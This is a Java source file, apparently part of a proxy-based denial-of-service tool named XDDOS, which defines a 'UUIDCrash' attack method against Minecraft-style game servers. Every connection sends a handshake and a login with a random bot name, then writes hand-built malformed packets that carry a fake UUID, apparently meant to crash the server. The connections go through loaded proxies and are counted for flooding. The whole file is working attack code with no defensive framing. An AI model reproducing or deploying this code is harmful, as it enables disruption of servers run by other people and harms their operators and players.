package XD.XDDOS.methods.impl;

import java.io.IOException;
import java.security.SecureRandom;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.helper.RandomUtils;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;


public class UUIDCrash
implements IMethod{

    final int a = Integer.parseInt(System.getProperty("len", "25555"));
    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

        try {
            channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(9999) + "_XDDOS_" + (new SecureRandom()).nextInt(9999))).getWrappedPacket()));
            String nick = RandomUtils.randomString(3);
            bbbb.write(nick.length() + 2);
            bbbb.write(0);
            bbbb.write(nick.length());
            bbbb.writeBytes(nick);
            String uuid = "a2xSdioDOANdo92JIdIADc";
            bbbb.write(uuid.length() + nick.length() + 3);
            bbbb.write(2);
            bbbb.write(uuid.length());
            bbbb.writeBytes(uuid);
            bbbb.write(nick.length());
            bbbb.writeBytes(nick);
        } catch (IOException var7) {
            var7.printStackTrace();
        }

        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        ++NettyBootstrap.integer;
        NettyBootstrap.totalConnections++;
        channel.close();
    }

}
